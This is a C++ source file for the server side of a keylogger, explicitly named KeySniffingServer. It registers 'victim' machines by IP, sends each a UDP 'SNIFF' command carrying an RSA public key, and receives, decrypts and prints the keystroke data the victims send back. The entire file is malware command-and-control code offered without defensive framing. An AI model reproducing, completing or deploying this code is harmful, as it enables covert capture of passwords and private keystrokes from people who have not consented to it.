#include "common/messages.hpp"
#include "server.hpp"

Victim::Victim(int id, const std::string &ip)
    : id_(id), ip_(ip)
{
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(ip.c_str());
    addr.sin_port = htons(10000);

    addr_ = addr;
}

int Victim::Id() const
{
    return id_;
}

std::string Victim::Ip() const
{
    return ip_;
}

struct sockaddr_in Victim::Addr() const
{
    return addr_;
}

KeySniffingServer::KeySniffingServer(std::string const &ip, int port)
    : stop_(false), thrRecv_(NULL)
{
    int sockfd;
    struct sockaddr_in addr;
    rsa_key key;

    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip.c_str());

    sockfd_ = sockfd;
    addr_ = addr;

    if (Cryptographer::GenerateKey(&key) == -1) {
        std::cout << "Fail to generate rsa key!" << std::cout;
        return;
    }
    cryptographer_.SetKey(key);
}

void KeySniffingServer::AddVictim(const std::string &ip)
{
    int id = victims_.size();
    Victim *victim = new Victim(id, ip);
    victims_[id] = victim;
}

void KeySniffingServer::Start()
{
    thrRecv_ = new std::thread(&KeySniffingServer::ReceiveKeySniffingInfo, this);

    for (Victims::const_iterator it = victims_.begin(); it != victims_.end(); ++it) {
        StartSniffing(*it->second);
    }
}

void KeySniffingServer::Stop()
{
    stop_ = true;
    thrRecv_->join();
}

void KeySniffingServer::Wait()
{
    thrRecv_->join();
}

void KeySniffingServer::StartSniffing(const Victim &victim)
{
    char buffer[1024];
    int length, count;
    StartSniffingMessage message;

    strcpy(message.keyword, "SNIFF");
    message.server = addr_;
    message.port = port_;
    message.public_key = cryptographer_.GetKey();
    message.victim = victim.Id();

    length = message.Serialize((unsigned char *)buffer, sizeof(buffer));
    if (length == -1) {
        std::cout << "Fail to create start sniffing message!" << std::endl;
        return;
    }

    struct sockaddr_in toaddr = victim.Addr();
    count = sendto(sockfd_, buffer, length, 0, (struct sockaddr *)&toaddr, sizeof(struct sockaddr));
    if (count != length) {
        std::cout << "Fail to send start sniffing message!" << std::endl;
        return;
    }

    std::cout << "Start sniffing message has been sent to victim #" << victim.Id() << " on " << victim.Ip() << std::endl;
}

void KeySniffingServer::ReceiveKeySniffingInfo()
{
    char in[1024];
    unsigned char out[1024];
    unsigned long inlen, outlen;
    struct sockaddr_in srcaddr;
    KeySniffingMessage message;

    outlen = sizeof(out);
    socklen_t srcaddr_len = sizeof(srcaddr);

    std::cout << "Start for receiving key sniffing info..." << std::endl;
    while(!stop_)
    {
        inlen = recvfrom(sockfd_, in, sizeof(in), 0, (struct sockaddr*)&srcaddr, &srcaddr_len);
        std::string ip = inet_ntoa(srcaddr.sin_addr);
        std::cout << "Received " << inlen << " bytes from " << ip << std::endl;
        if (cryptographer_.Decrypt((const unsigned char *)in, inlen, out, &outlen) == -1) {
            std::cout << "Fail to decrypt message" << std::endl;
        }

        message.Deserialize(out, outlen);
        std::cout << "Message: " << message.ToString() << std::endl;
    }
    std::cout << "Receivng key sniffing info has terminated" << std::endl;
}

int crypto_init_environment()
{
    if (register_prng(&sprng_desc) == -1) {
        printf("Error registering sprng");
        return -1;
    }

    /* register a math library (in this case TomsFastMath) */
    ltc_mp = tfm_desc;
    if (register_hash(&sha1_desc) == -1) {
        printf("Error registering sha1");
        return -1;
    }

    return 0;
}

int crypto_free_environment()
{
    if (unregister_hash(&sha1_desc) == -1) {
        printf("Error unregistring sha1");
        return -1;
    }

    //ltc_mp = (const ltc_math_descriptor) {0};

    if (unregister_prng(&sprng_desc) == -1) {
        printf("Error unregistering sprng");
        return -1;
    }

    return 0;
}
